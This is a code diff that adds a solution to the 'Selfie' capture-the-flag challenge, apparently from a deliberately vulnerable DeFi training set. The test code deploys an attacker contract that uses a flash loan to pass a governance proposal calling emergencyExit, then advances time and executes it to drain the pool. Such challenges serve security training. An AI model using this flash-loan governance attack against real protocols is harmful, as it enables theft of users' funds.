@@ -39,6 +39,24 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        /*
+         * We notice that SelfiePool features an emergencyExit function that can only be called by governance and would allow draining funds
+         * We must use a flashloan to pass a proposal that would do just that
+         */
+
+        // We encode the proposal "emergencyExit(player.address)"
+        const iface = new ethers.utils.Interface(["function emergencyExit(address)"]);
+        const data = iface.encodeFunctionData("emergencyExit", [player.address]);
+
+        const attackContract = await ethers.getContractFactory('SelfieAttacker', player);
+        const attacker = await attackContract.deploy(pool.address, token.address, governance.address);
+        await attacker.connect(player).attack(data);
+
+        // We increase the time before passing the proposal
+        await ethers.provider.send("evm_increaseTime", [Number(await governance.getActionDelay())]);
+
+        // We now can execute the action
+        await governance.connect(player).executeAction(Number(await governance.getActionCounter()) - 1);
     });
 
     after(async function () {
